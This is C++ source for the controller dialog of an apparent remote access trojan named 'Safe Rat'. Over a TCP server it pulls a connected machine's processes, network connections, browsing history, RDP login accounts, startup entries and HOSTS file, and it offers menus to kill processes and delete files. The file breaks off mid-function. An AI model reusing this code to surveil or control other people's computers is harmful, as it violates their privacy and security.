// CHostDlg.cpp: 实现文件
//

#include "pch.h"
#include "Safe Rat.h"
#include "CHostDlg.h"
#include "afxdialogex.h"
#include "CInputDlg.h"



struct  WINDOWSINFO
{
	TCHAR strTitle[1024];
	DWORD m_poceessid;
	DWORD m_hwnd;
	bool canlook;
	int w;
	int h;
};
struct  Browsinghistory
{
	char strTime[100];
	WCHAR strTitle[1024];
	WCHAR strUrl[1024];

};

double round(double r){ return (r > 0.0) ? floor(r + 0.5) : ceil(r - 0.5);}
// CHostDlg 对话框

IMPLEMENT_DYNAMIC(CHostDlg, CXTPResizeDialog)

CHostDlg::CHostDlg(CWnd* pParent /*=NULL*/, CHpTcpServer* pIOCPServer, ClientContext *pContext)
	: CXTPResizeDialog(IDD_HOST_DLG, pParent)
{
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICON_HOST));
	m_bOnClose = FALSE;

	m_nSortedCol = 1;
	m_bAscending = true;

}

CHostDlg::~CHostDlg()
{
	DestroyIcon(m_hIcon);
}

void CHostDlg::DoDataExchange(CDataExchange* pDX)
{
	CXTPResizeDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_TAB1, m_tab);
	DDX_Control(pDX, IDC_LIST1, m_list);
}


BEGIN_MESSAGE_MAP(CHostDlg, CXTPResizeDialog)
	ON_WM_SIZE()
	ON_WM_CLOSE()
	ON_NOTIFY(TCN_SELCHANGE, IDC_TAB1, &CHostDlg::OnTcnSelchangeTab1)
	ON_NOTIFY(TCN_SELCHANGING, IDC_TAB1, &CHostDlg::OnTcnSelchangingTab1)
	ON_NOTIFY(NM_RCLICK, IDC_LIST1, &CHostDlg::OnNMRClickList1)
END_MESSAGE_MAP()


// CHostDlg 消息处理程序

void CHostDlg::OnSize(UINT nType, int cx, int cy)
{
	CXTPResizeDialog::OnSize(nType, cx, cy);

	// TODO: 在此处添加消息处理程序代码
}

BOOL CHostDlg::OnInitDialog()
{
	CXTPResizeDialog::OnInitDialog();

	m_SQQwry.SetPath("qqwry.dat");

	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	CString str;
	str.Format("%s - 计算机管理", m_pContext->m_RemoteIP);
	SetWindowText(str);

	////设置图标
	m_ImgList.Create(16, 16, ILC_COLOR32 | ILC_MASK, 15, 1);
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICON_OS));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICON_CPU));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICON_MAC));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICON_MEM));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICON_HD));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICON_SCR));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICON_GTX));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICON_METE));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICON_TK));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICON_MSTSC));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICON_EXEPATH));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICON_TIME));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICON_PROC));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICON_INET));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICON_WIN));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICON_USER));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICON_UNSTALL));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICON_IE));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICON_MSTSC_H));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICON_START));
	m_list.SetImageList(&m_ImgList, LVSIL_SMALL);


	m_tab.SetPadding(CSize(6, 3));
	m_tab.ModifyTabStyle(0, TCS_MULTILINE);
	//自适应窗口
	SetResize(IDC_LIST1, XTP_ANCHOR_TOPLEFT, XTP_ANCHOR_BOTTOMRIGHT);

	int i = 0;
	m_tab.InsertItem(i++, _T("详细信息"));
	m_tab.InsertItem(i++, _T("进程管理"));
	m_tab.InsertItem(i++, _T("网络连接"));
	m_tab.InsertItem(i++, _T("窗口管理"));
	m_tab.InsertItem(i++, _T("用户列表"));
	m_tab.InsertItem(i++, _T("用户活动"));
	m_tab.InsertItem(i++, _T("软件信息"));
	m_tab.InsertItem(i++, _T("浏览记录"));
	m_tab.InsertItem(i++, _T("远程连接记录"));
	m_tab.InsertItem(i++, _T("启动项"));
	m_tab.InsertItem(i++, _T("HOSTS"));

	m_tab.SetCurSel(0);

	HWND hWndHeader = m_list.GetDlgItem(0)->GetSafeHwnd();
	m_heades.SubclassWindow(hWndHeader);
	m_heades.SetTheme(new CXTHeaderCtrlThemeOfficeXP());

	//发送获取详细信息
	BYTE token = COMMAND_MACHINE_INFO;
	m_iocpServer->Send(m_pContext,&token, 1);

	return TRUE;  
				  
}

void CHostDlg::OnReceiveComplete()
{
	if (m_bOnClose) 	return;
	DeleteList();

	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_MACHINE_INFO:
		ShowInfoList();
		break;
	case TOKEN_MACHINE_PROCESS:
		ShowProcessList();
		break;
	case TOKEN_MACHINE_NET:
		ShownNetList();
		break;
	case TOKEN_MACHINE_WINDOWS:
		ShowWindowsList();
		break;
	case TOKEN_MACHINE_USER_INFO:
		ShowUserInfoList();
		break;
	case TOKEN_MACHINE_USER:
		ShowUserList();
		break;
	case TOKEN_MACHINE_SOFTWARE:
		ShowSoftWareList();
		break;
	case TOKEN_MACHINE_HTML:
		ShowIEHistoryList();
		break;
	case TOKEN_MACHINE_HOSTS:
		ShowHostsList();
		break;
	case TOKEN_MACHINE_MSTSC:
		ShowMstscList();
		break;
	case TOKEN_MACHINE_STARTUP:
		ShowStartup();
		break;
	default:
		break;
	}
}

void CHostDlg::ShowInfoList()
{
	m_list.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_SUBITEMIMAGES | LVS_EX_GRIDLINES);
	m_list.InsertColumn(0, _T("项目"), LVCFMT_LEFT, 200);
	m_list.InsertColumn(1, _T("内容"), LVCFMT_LEFT, 400);

	tagSystemInfo* lpBuffer = (tagSystemInfo*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));

	//设置系统
	m_list.InsertItem(0, "当前系统",0);
	m_list.SetItemText(0, 1, lpBuffer->Os);
	//设置CPU
	m_list.InsertItem(1, "CPU", 1);
	m_list.SetItemText(1, 1, lpBuffer->szCpuInfo);
	//设置Mac
	m_list.InsertItem(2, "MAC", 2);
	m_list.SetItemText(2, 1, lpBuffer->szMac);
	//设置运行内存
	ULONG64 MemSize = round((double)lpBuffer->szMemory.ullTotalPhys / (1024 * 1024 * 1024));
	CString str;
	str.Format("%dGB", MemSize);
	m_list.InsertItem(3, "运行内存", 3);
	m_list.SetItemText(3, 1, str);
	//设置硬盘
	str.Format("%dGB", lpBuffer->szDriveSize);
	m_list.InsertItem(4, "硬盘", 4);
	m_list.SetItemText(4, 1, str);
	//分辨率
	m_list.InsertItem(5, "分辨率", 5);
	m_list.SetItemText(5, 1, lpBuffer->szScrSize);
	//显卡
	m_list.InsertItem(6, "显卡", 6);
	m_list.SetItemText(6, 1, lpBuffer->szGraphics);


	//远程终端
	m_list.InsertItem(7, "远程端口", 9);
	lpBuffer->mstsc ? str.Format("%d", lpBuffer->mstsc) : str = "未开启";
	m_list.SetItemText(7, 1, str);
	//程序路径
	m_list.InsertItem(8, "程序路径", 10);
	m_list.SetItemText(8, 1, lpBuffer->Program);
	//活动时间
	m_list.InsertItem(9, "活动时间", 11);
	m_list.SetItemText(9, 1, lpBuffer->szActiveTime);

}
//用户列表
void CHostDlg::ShowUserInfoList()
{
	m_list.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_SUBITEMIMAGES | LVS_EX_GRIDLINES);
	m_list.InsertColumn(0, _T("用户名"), LVCFMT_LEFT, 260);
	m_list.InsertColumn(1, _T("用户组"), LVCFMT_LEFT, 260);
	m_list.InsertColumn(2, _T("状态"), LVCFMT_LEFT, 100);

	LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	char* lpTitle = NULL;
	CString	str;
	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		str = (char*)lpBuffer + dwOffset;
		if (str == "")return;

		m_list.InsertItem(i, str,15);
		dwOffset += str.GetLength() + 1;

		str = (char*)lpBuffer + dwOffset;
		dwOffset += str.GetLength() + 1;

		m_list.SetItemText(i, 1, str);
		str = (char*)lpBuffer + dwOffset;

		dwOffset += str.GetLength() + 1;
		m_list.SetItemText(i, 2, str);
	}

}
//活动用户
void CHostDlg::ShowUserList()
{
	m_list.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_SUBITEMIMAGES | LVS_EX_GRIDLINES);
	m_list.InsertColumn(0, _T("状态"), LVCFMT_LEFT, 100);
	m_list.InsertColumn(1, _T("用户名"), LVCFMT_LEFT, 200);
	m_list.InsertColumn(2, _T("客户端名"), LVCFMT_LEFT, 200);
	m_list.InsertColumn(3, _T("会话"), LVCFMT_LEFT, 200);
	m_list.InsertColumn(4, _T("ID"), LVCFMT_LEFT, 100);
	char* lpBuffer = (char*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD lpBufferlen = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	char* ConnectionState;
	char* UserName;
	char* DomainName;
	char* ProtocolType;

	DWORD	dwOffset = 0;
	CString str;


	for (int i = 0; dwOffset < lpBufferlen; i++)
	{

		ConnectionState = lpBuffer + dwOffset;
		m_list.InsertItem(i, ConnectionState,15);
		dwOffset += lstrlen(ConnectionState) + 1;

		UserName = lpBuffer + dwOffset;
		m_list.SetItemText(i, 1, UserName);
		dwOffset += lstrlen(UserName) + 1;

		DomainName = lpBuffer + dwOffset;
		m_list.SetItemText(i, 2, DomainName);
		dwOffset += lstrlen(DomainName) + 1;

		ProtocolType = lpBuffer + dwOffset;
		m_list.SetItemText(i, 3, ProtocolType);
		dwOffset += lstrlen(ProtocolType) + 1;

		LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);
		str.Format("%d",*lpPID);
		m_list.SetItemText(i, 4, str);
		m_list.SetItemData(i, *lpPID);
		dwOffset += sizeof(DWORD) + 1;

	}
}
//显示网络连接
void CHostDlg::ShownNetList()
{
	m_list.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_SUBITEMIMAGES | LVS_EX_GRIDLINES);
	m_list.InsertColumn(0, "进程名", LVCFMT_LEFT, 160);
	m_list.InsertColumn(1, "PID", LVCFMT_LEFT, 60);
	m_list.InsertColumn(2, "协议", LVCFMT_LEFT, 50);
	m_list.InsertColumn(3, "本地地址:端口", LVCFMT_LEFT, 150);
	m_list.InsertColumn(4, "远程地址:端口", LVCFMT_LEFT, 150);
	m_list.InsertColumn(5, "目标IP归属地", LVCFMT_LEFT, 300);
	m_list.InsertColumn(6, "连接状态", LVCFMT_LEFT, 80);

	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	DWORD	lpBufferLen = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	CString str, IPAddress;

	for (int i = 0; dwOffset < lpBufferLen; i++)
	{
		//循环插入7项
		for (int j = 0; j < 7; j++)
		{
			if (j == 0)
			{
				char* lpString = (char*)lpBuffer + dwOffset;
				m_list.InsertItem(i, lpString, 13);
				dwOffset += lstrlen(lpString) + 1;

			}
			else if (j == 1)
			{
				LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);
				str.Format("%d", *lpPID);
				m_list.SetItemText(i, j, str);
				m_list.SetItemData(i, *lpPID);

				dwOffset += sizeof(DWORD) + 1;
			}
			else if (j == 5)
			{
				IPAddress = m_list.GetItemText(i, 4);

				int n = IPAddress.ReverseFind(':');
				if (n > 0)
				{
					IPAddress = IPAddress.Left(n);
					str = m_SQQwry.IPtoAdd(IPAddress);
					m_list.SetItemText(i, j, str);
				}
			}
			else
			{
				char* lpString = (char*)lpBuffer + dwOffset;
				m_list.SetItemText(i, j, lpString);
				dwOffset += lstrlen(lpString) + 1;
			}	
		}
	}
}

void CHostDlg::ShowStartup()
{
	m_list.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_SUBITEMIMAGES | LVS_EX_GRIDLINES);
	m_list.InsertColumn(0, _T("程序名称"), LVCFMT_LEFT, 200);
	m_list.InsertColumn(1, _T("程序路径"), LVCFMT_LEFT, 300);
	m_list.InsertColumn(2, _T("键值"), LVCFMT_LEFT, 500);

	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	pBufferLen = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	DWORD	dwOffset = 0;

	for (int i = 0; dwOffset < pBufferLen; i++)
	{
		for (int j = 0; j < 3; j++)
		{
			char* lpString = (char*)lpBuffer + dwOffset;

			if (j == 0)
				m_list.InsertItem(i, lpString, 19);
			else
				m_list.SetItemText(i, j, lpString);

			dwOffset += lstrlen(lpString) + 1;
		}
	}


}
void CHostDlg::ShowMstscList()
{
	m_list.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_SUBITEMIMAGES | LVS_EX_GRIDLINES);
	m_list.InsertColumn(0, _T("ip"), LVCFMT_LEFT, 200);
	m_list.InsertColumn(1, _T("连接时使用的账户"), LVCFMT_LEFT, 300);

	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	DWORD	pBufferLen = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;

	for (size_t i = 0;  dwOffset < pBufferLen; i++)
	{	

		for (size_t j = 0; j < 2; j++)
		{
			char* String = (char*)lpBuffer + dwOffset;

			if (j == 0)
			{
				m_list.InsertItem(i, String,18);
			}
			else
				m_list.SetItemText(i, j, String);

			dwOffset += lstrlen(String) + 1;
		}
	}
}

CString CHostDlg::UnicodeToAnsi(WCHAR* szStr)
{
	CString str = "未知";

	int nLen = WideCharToMultiByte(CP_ACP, 0, szStr, -1, NULL, 0, NULL, NULL);
	if (nLen == 0) return str;
	char* pResult = new char[nLen];
	WideCharToMultiByte(CP_ACP, 0, szStr, -1, pResult, nLen, NULL, NULL);
	str = pResult;
	delete[] pResult;
	return str;
}

void CHostDlg::ShowHostsList()
{

	m_list.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_SUBITEMIMAGES | LVS_EX_GRIDLINES);
	m_list.InsertColumn(0, _T("数据"), LVCFMT_LEFT, 600);

	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));

	int i = 0;
	char* buf;
	char* lpString = (char*)lpBuffer;
	const char* d = "\n";
	char* p = strtok_s(lpString, d, &buf);
	CString tem;
	while (p)
	{
		tem = p;
		m_list.InsertItem(i, tem,-1);
		p = strtok_s(NULL, d, &buf);
		i++;
	}
}

//显示IE历史记录
void CHostDlg::ShowIEHistoryList()
{
	m_list.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_SUBITEMIMAGES | LVS_EX_GRIDLINES);
	m_list.InsertColumn(0, _T("序号"), LVCFMT_LEFT, 70);
	m_list.InsertColumn(1, _T("访问时间"), LVCFMT_LEFT, 130);
	m_list.InsertColumn(2, _T("标题"), LVCFMT_LEFT, 150);
	m_list.InsertColumn(3, _T("网页地址"), LVCFMT_LEFT, 400);
	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	CString	str;
	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		Browsinghistory* p_Browsinghistory = (Browsinghistory*)((char*)lpBuffer + dwOffset);
		str.Format(_T("%d"), i);
		m_list.InsertItem(i, str, 17);

		m_list.SetItemText(i, 1, p_Browsinghistory->strTime);
		m_list.SetItemText(i, 2, UnicodeToAnsi(p_Browsinghistory->strTitle));
		m_list.SetItemText(i, 3, UnicodeToAnsi(p_Browsinghistory->strUrl));
		dwOffset += sizeof(Browsinghistory);
	}

}
//显示软件安装信息
void CHostDlg::ShowSoftWareList()
{
	m_list.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_SUBITEMIMAGES | LVS_EX_GRIDLINES);
	m_list.InsertColumn(0, _T("软件名称"), LVCFMT_LEFT, 130);
	m_list.InsertColumn(1, _T("发行商"), LVCFMT_LEFT, 85);
	m_list.InsertColumn(2, _T("版本"), LVCFMT_LEFT, 75);
	m_list.InsertColumn(3, _T("安装时间"), LVCFMT_LEFT, 80);
	m_list.InsertColumn(4, _T("卸载命令及参数"), LVCFMT_LEFT, 300);

	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;

	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		for (int j = 0; j < 5; j++)
		{
			TCHAR* lpString = (TCHAR*)(lpBuffer + dwOffset);

			if (j == 0)
				m_list.InsertItem(i, lpString, 16);
			else
				m_list.SetItemText(i, j, lpString);

			dwOffset += lstrlen(lpString) * sizeof(TCHAR) + 2;
		}
	}
}
//显示窗口信息
void CHostDlg::ShowWindowsList()
{
	m_list.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT | LVS_EX_SUBITEMIMAGES);

	m_list.InsertColumn(0, _T("PID"), LVCFMT_LEFT, 75);
	m_list.InsertColumn(1, _T("句柄HWND"), LVCFMT_LEFT, 75);
	m_list.InsertColumn(2, _T("窗口名称"), LVCFMT_LEFT, 300);
	m_list.InsertColumn(3, _T("窗口状态"), LVCFMT_LEFT, 100);
	m_list.InsertColumn(4, _T("大小"), LVCFMT_LEFT, 100);

	LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	TCHAR* lpTitle = NULL;
	CString	str; int i;

	WINDOWSINFO m_ibfo;
	for (i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		memcpy(&m_ibfo, lpBuffer + dwOffset, sizeof(WINDOWSINFO));

		str.Format(_T("%5u"), m_ibfo.m_poceessid);
		m_list.InsertItem(i, str, 14);
		TCHAR t_hwnd[250];
		_stprintf_s(t_hwnd, 250, _T("%d"), m_ibfo.m_hwnd);
		m_list.SetItemText(i, 1, t_hwnd);
		m_list.SetItemText(i, 2, m_ibfo.strTitle);
		m_list.SetItemText(i, 3, m_ibfo.canlook ? _T("显示") : _T("隐藏"));
		str.Format(_T("%d*%d"), m_ibfo.w, m_ibfo.h);
		m_list.SetItemText(i, 4, str);
		// ItemData 为进程ID
		m_list.SetItemData(i, m_ibfo.m_poceessid);
		dwOffset += sizeof(WINDOWSINFO);
	}
	str.Format(_T("窗口名称 / %d"), i);
	LVCOLUMN lvc = {};
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_list.SetColumn(2, &lvc);

}
//显示进程列表
void CHostDlg::ShowProcessList()
{
	//设置字段
	m_list.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT | LVS_EX_SUBITEMIMAGES);
	m_list.InsertColumn(0, _T("映像名称"), LVCFMT_LEFT, 100);
	m_list.InsertColumn(1, _T("PID"), LVCFMT_LEFT, 50);
	m_list.InsertColumn(2, _T("优先级"), LVCFMT_LEFT, 50);
	m_list.InsertColumn(3, _T("线程数"), LVCFMT_LEFT, 50);
	m_list.InsertColumn(4, _T("用户名"), LVCFMT_LEFT, 70);
	m_list.InsertColumn(5, _T("内存"), LVCFMT_LEFT, 70);
	m_list.InsertColumn(6, _T("文件大小"), LVCFMT_LEFT, 80);
	m_list.InsertColumn(7, _T("程序路径"), LVCFMT_LEFT, 300);
	m_list.InsertColumn(8, _T("窗口名称"), LVCFMT_LEFT, 100);
	m_list.InsertColumn(9, _T("进程位数"), LVCFMT_LEFT, 80);

	char* lpBuffer = (char*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	TCHAR* strExeFile;				//exe路径
	TCHAR* strProcessName;			//进程名	
	TCHAR* strTemp;					//临时格式化用
	DWORD	dwOffset = 0;			//偏移

	CString str;					
	TCHAR* strProcessUser;
	int i = 0;
	TCHAR* szBuf_title;

	for (i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);

		bool* is64 = (bool*)(lpBuffer + dwOffset + sizeof(DWORD));

		szBuf_title = (TCHAR*)(lpBuffer + dwOffset + sizeof(DWORD) + sizeof(bool));

		strExeFile = (TCHAR*)((byte*)szBuf_title + MAX_PATH * sizeof(TCHAR));

		strProcessName = (TCHAR*)((byte*)strExeFile + lstrlen(strExeFile) * sizeof(TCHAR) + 2);

		strTemp = (TCHAR*)((byte*)strProcessName + lstrlen(strProcessName) * sizeof(TCHAR) + 2);

		LPDWORD	lpdwPriClass = LPDWORD((byte*)strTemp);

		LPDWORD	lpdwThreads = LPDWORD((byte*)strTemp + sizeof(DWORD));

		strProcessUser = (TCHAR*)((byte*)strTemp + sizeof(DWORD) * 2);

		LPDWORD	lpdwWorkingSetSize = LPDWORD((byte*)strProcessUser + lstrlen(strProcessUser) * sizeof(TCHAR) + 2);

		LPDWORD	lpdwFileSize = LPDWORD((byte*)strProcessUser + lstrlen(strProcessUser) * sizeof(TCHAR) + 2 + sizeof(DWORD));

		m_list.InsertItem(i, strExeFile, 12);

		str.Format(_T("%5u"), *lpPID);
		m_list.SetItemText(i, 1, str);

		m_list.SetItemText(i, 2, __MakePriority(*lpdwPriClass));

		str.Format(_T("%5u"), *lpdwThreads);
		m_list.SetItemText(i, 3, str);

		m_list.SetItemText(i, 4, strProcessUser);

		str.Format(_T("%5u K"), *lpdwWorkingSetSize);
		m_list.SetItemText(i, 5, str);

		str.Format(_T("%5u KB"), *lpdwFileSize);
		m_list.SetItemText(i, 6, str);

		m_list.SetItemText(i, 7, strProcessName);

		m_list.SetItemText(i, 8, szBuf_title);

		m_list.SetItemText(i, 9, (*is64) ? _T("x64") : _T("x86"));

		m_list.SetItemData(i, *lpPID);
		dwOffset += sizeof(DWORD) * 5 + sizeof(bool) + MAX_PATH * sizeof(TCHAR) + lstrlen(strExeFile) * sizeof(TCHAR) + lstrlen(strProcessName) * sizeof(TCHAR) + lstrlen(strProcessUser) * sizeof(TCHAR) + 6;
	}

	str.Format(_T("程序路径 / %d"), i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_list.SetColumn(7, &lvc);

}
//判断进程优先级
CString CHostDlg::__MakePriority(DWORD dwPriClass)
{
	CString strRet;
	switch (dwPriClass)
	{
	case REALTIME_PRIORITY_CLASS:
		strRet = _T("实时");
		break;
	case HIGH_PRIORITY_CLASS:
		strRet = _T("高");
		break;
	case ABOVE_NORMAL_PRIORITY_CLASS:
		strRet = _T("高于标准");
		break;
	case NORMAL_PRIORITY_CLASS:
		strRet = _T("标准");
		break;
	case BELOW_NORMAL_PRIORITY_CLASS:
		strRet = _T("低于标准");
		break;
	case IDLE_PRIORITY_CLASS:
		strRet = _T("空闲");
		break;
	default:
		strRet = _T("未知");
		break;
	}
	return strRet;
}
//清空列表框
void CHostDlg::DeleteList()
{
	m_list.DeleteAllItems();
	int nColumnCount = m_list.GetHeaderCtrl()->GetItemCount();

	for (int n = 0; n < nColumnCount; n++)
	{
		m_list.DeleteColumn(0);
	}
}

void CHostDlg::PostNcDestroy()
{
	if (!m_bOnClose)
		OnClose();

	CXTPResizeDialog::PostNcDestroy();
	delete this;
}

BOOL CHostDlg::PreTranslateMessage(MSG* pMsg)
{
	if (
		pMsg->message == WM_KEYDOWN		
		&&(	pMsg->wParam == VK_ESCAPE	 
		||	pMsg->wParam == VK_CANCEL	
		||	pMsg->wParam == VK_RETURN	
		))
		return TRUE;

	return CXTPResizeDialog::PreTranslateMessage(pMsg);
}

void CHostDlg::OnClose()
{
	m_iocpServer->Disconnect(m_pContext);
	m_bOnClose = TRUE;
	CXTPResizeDialog::OnClose();
}

//排序
void CHostDlg::SortColumn(int iCol, bool bAsc)
{
	m_bAscending = bAsc;
	m_nSortedCol = iCol;
	CXTPSortClass csc(&m_list, m_nSortedCol);
	csc.Sort(m_bAscending, xtpSortString);
}

BOOL CHostDlg::OnNotify(WPARAM wParam, LPARAM lParam, LRESULT* pResult)
{
	HD_NOTIFY* pHDNotify = (HD_NOTIFY*)lParam;

	if (pHDNotify->hdr.code == HDN_ITEMCLICKA ||
		pHDNotify->hdr.code == HDN_ITEMCLICKW)
	{
		if (pHDNotify->iItem == m_nSortedCol)
			SortColumn(pHDNotify->iItem, !m_bAscending);
		else
			SortColumn(pHDNotify->iItem, m_heades.GetAscending() ? true : false);
	}

	return CXTPResizeDialog::OnNotify(wParam, lParam, pResult);
}

void CHostDlg::OnTcnSelchangeTab1(NMHDR *pNMHDR, LRESULT *pResult)
{
	reflush();
	*pResult = 0;
}

//tab更换触发
void CHostDlg::reflush()
{
	int nID = m_tab.GetCurSel();
	DeleteList();

	BYTE token = HOST(nID);
	m_iocpServer->Send(m_pContext, (LPBYTE)&token, 1);
}

void CHostDlg::OnTcnSelchangingTab1(NMHDR *pNMHDR, LRESULT *pResult)
{
	// TODO: 在此添加控件通知处理程序代码
	*pResult = 0;
}

//右键点击
void CHostDlg::OnNMRClickList1(NMHDR *pNMHDR, LRESULT *pResult)
{
	//获取选中项
	int nID = m_tab.GetCurSel();
	switch (nID)
	{
		
		case COMMAND_MACHINE_INFO: ShowInfoList_menu(); break;
		case COMMAND_MACHINE_PROCESS :ShowProcessList_menu(); break;
		case COMMAND_MACHINE_NET:ShowNetList_menu(); break;
		case COMMAND_MACHINE_WINDOWS:ShowWndowsList_menu(); break;
		case COMMAND_MACHINE_USER_INFO:ShowUserinfoList_menu(); break;
		case COMMAND_MACHINE_USER:ShowUserList_menu(); break;
		case COMMAND_MACHINE_SOFTWARE:ShowSoftwareList_menu(); break;
		case COMMAND_MACHINE_HTML:ShowHtmlList_menu(); break;
		case COMMAND_MACHINE_MSTSC:ShowMstscList_menu(); break;
		case COMMAND_MACHINE_STARTUP: ShowStartupList_menu(); break;
		case COMMAND_MACHINE_HOSTS: ShowHostsList_menu(); break;
		default:
			break;		
	}

	*pResult = 0;
}

//设置剪切板
void CHostDlg::SetClipboardText(CString& Data)
{
	CString source;
	source = Data;
	//文本内容保存在source变量中
	if (OpenClipboard())
	{
		HGLOBAL clipbuffer;
		char* buffer;
		EmptyClipboard();
		clipbuffer = GlobalAlloc(GMEM_DDESHARE, source.GetLength() + 1);
		buffer = (char*)GlobalLock(clipbuffer);
		strcpy_s(buffer, strlen(source) + 1, LPCSTR(source));
		GlobalUnlock(clipbuffer);
		SetClipboardData(CF_TEXT, clipbuffer);
		CloseClipboard();
	}
}

//详细信息菜单
void CHostDlg::ShowInfoList_menu()
{
	CMenu menu;
	VERIFY(menu.CreatePopupMenu());
	menu.AppendMenu(MF_STRING | MF_ENABLED, 50, _T("刷新数据"));
	menu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("复制数据"));
	CPoint	p;
	GetCursorPos(&p);
	int nMenuResult = CXTPCommandBars::TrackPopupMenu(&menu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, p.x, p.y, this, NULL);
	if (!nMenuResult) 	return;
	switch (nMenuResult)
	{
		case 50:	reflush(); break;
		case 100:
		{
			int	nItem = m_list.GetSelectionMark();
			if (nItem >= 0)
			{
				//获取内容
				CString temp = m_list.GetItemText(nItem, 1);
				SetClipboardText(temp);
			}
		}
	}
	menu.DestroyMenu();
}
//进程菜单
void CHostDlg::ShowProcessList_menu()
{
	CMenu menu;
	VERIFY(menu.CreatePopupMenu());
	menu.AppendMenu(MF_STRING | MF_ENABLED, 50, _T("刷新数据(&F)"));
	menu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("复制数据(&V)"));
	menu.AppendMenu(MF_SEPARATOR, NULL);
	menu.AppendMenu(MF_STRING | MF_ENABLED, 200, _T("删除文件(&C)"));
	menu.AppendMenu(MF_STRING | MF_ENABLED, 300, _T("结束进程(&E)"));
	menu.AppendMenu(MF_STRING | MF_ENABLED, 400, _T("冻结进程(&D)"));
	menu.AppendMenu(MF_STRING | MF_ENABLED, 500, _T("解冻进程(&J)"));
	menu.AppendMenu(MF_SEPARATOR, NULL);
	menu.AppendMenu(MF_STRING | MF_ENABLED, 600, _T("强删文件(&Q)"));

	CPoint	p;
	GetCursorPos(&p);
